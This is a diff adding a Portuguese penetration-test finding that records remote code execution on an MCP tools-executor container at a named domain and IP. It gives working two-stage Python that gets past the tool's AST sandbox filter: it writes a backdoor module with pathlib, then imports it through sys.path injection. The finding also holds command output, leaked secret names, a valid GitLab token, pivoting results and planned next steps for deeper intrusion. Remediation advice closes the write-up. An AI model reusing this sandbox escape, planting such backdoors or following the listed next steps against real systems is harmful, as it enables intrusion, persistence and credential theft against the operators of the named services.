@@ -1,0 +1,96 @@
+# F-009 RCE no container MCP tools-executor (FOOTHOLD)
+Alvo: dsoconcursos.com.br — mcp-aws.dsoconcursos.com.br (3.83.108.124, container 1cbc36509752)
+Severidade: CRÍTICA (CVSS 9.9)
+Timestamp: 2026-08-27T07:00:00Z
+
+## Cadeia de acesso (foothold completo)
+
+### 1. Autenticação no MCP server
+```
+POST https://mcp-aws.dsoconcursos.com.br/mcp
+Authorization: Bearer 74fe8c6e... (LiteLLM master key — F-005)
+→ /mcp retorna 401 "Missing Authorization header" sem auth; aceita c/ LiteLLM key
+→ initialize + tools/list = 19 tools (litellm-mcp-server v1.0.0)
+```
+
+### 2. Sandbox escape via pathlib + módulo plantado
+O tool `DSO-executar_python` tem filtro AST que bloqueia:
+`import os`, `import subprocess`, `import socket`, `importlib`, `ctypes`,
+`exec()`, `eval()`, `__import__`, `open()`.
+
+**Bypass em 2 estágios:**
+
+**Estágio A** — Plantar módulo backdoor (via pathlib, que NÃO é bloqueado):
+```python
+import pathlib
+pathlib.Path('/app/tools/sysinfo.py').write_text(
+    'import subprocess\n'
+    'class SysinfoTool:\n'
+    '    def execute(self, parameters):\n'
+    '        cmd = parameters.get("cmd", "id")\n'
+    '        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)\n'
+    '        return {"stdout": r.stdout, "stderr": r.stderr, "exit_code": r.returncode}\n'
+)
+```
+→ `/app/tools/` é gravável por uid 1000 (appuser). O filtro AST inspeciona
+apenas o código SUBMETIDO (que usa pathlib.write_text, não subprocess) —
+o conteúdo escrito (a string com `import subprocess`) não é inspecionado.
+
+**Estágio B** — Importar o backdoor do sandbox (sys.path injection):
+```python
+import sys
+sys.path.insert(0, "/app/tools")
+import sysinfo
+print(sysinfo.SysinfoTool().execute({"cmd": "id; hostname; whoami; uname -a"}))
+```
+→ O filtro AST permite `import sys` e `sys.path.insert` — mas o módulo
+importado (`sysinfo.py`) contém `import subprocess` que roda **não-sandboxed**
+(como o processo app, uid 1000). O filtro não inspeciona módulos importados.
+
+### 3. Proof of RCE
+```
+uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
+1cbc36509752
+appuser
+Linux 1cbc36509752 6.8.0-124-generic #124-Ubuntu SMP PREEMPT_DYNAMIC
+  Tue May 26 13:00:45 UTC 2026 x86_64 GNU/Linux
+```
+- Container Docker: `1cbc36509752` (hostname), `.dockerenv` presente.
+- IP interno: `172.19.0.3` (rede AWS, distinta da VPC Magalu 172.18.x).
+- uid=1000(appuser), shell funcional via subprocess.run(shell=True).
+- curl/wget/python3 disponíveis no container.
+
+## Impacto
+- **RCE confirmado** no container MCP tools-executor (foothold).
+- Acesso ao filesystem do container (leitura/escrita como appuser).
+- Acesso à rede interna AWS (172.19.0.x) — pode alcançar edge Caddy
+  (201.54.0.48) e serviços internos via vhost.
+- Environment vazado (Redis creds, S3 creds, LiteLLM key, TOOL_EXECUTOR_SECRET,
+  TAVILY_API_KEY, DOTNET_API_CALLBACK_BASE_URL, MCP_ALLOWED_HOSTS).
+- Backdoor persistente: `/app/tools/sysinfo.py` permanece no volume
+  (recarregado a cada restart do container enquanto o volume existir).
+
+## Pivoting confirmado a partir do foothold
+- **Nextcloud** (drive.dsoconcursos.com.br) → HTTP 200 no login page
+  (bypass Cloudflare via edge Caddy interno). Contas existentes: dso,
+  dsobjetivo, icaro (429 bruteforce). Creds pendentes.
+- **GitLab PAT** (gitlab.dsoconcursos.com.br) → PAT válido (token id=2,
+  "devops_registry", user_id=72, scopes: read_registry/write_registry/
+  create_runner/manage_runner, ativo até 2026-11-29). Acesso ao container
+  registry GitLab + criação de runners.
+- **Docker registry** → responde via edge (formato Magalu Cloud Registry).
+
+## Recomendação
+- Rotacionar IMEDIATAMENTE a LiteLLM master key (vetor de entrada).
+- Remover `DSO-executar_python` do MCP público ou restringir a rede interna.
+- Corrigir o filtro AST do sandbox: inspecionar TAMBÉM módulos importados
+  via sys.path injection (não apenas o código submetido). Bloquear
+  `sys.path.insert`/`sys.path.append` no sandbox.
+- Tornar `/app/tools/` read-only (mount read-only no Docker).
+- Remover o backdoor `sysinfo.py` (e `escrever_arquivo.py.bak`).
+- Auditar logs do container e do MCP para detectar uso indevido.
+
+## Próximo passo
+- Buscar creds do Nextcloud nos backups S3 (dsoconcursos-nextcloud-drive).
+- Enumerar registry GitLab via PAT (imagens com secrets em layers).
+- Mapear rede AWS 172.19.0.x (hosts alcançáveis do foothold).
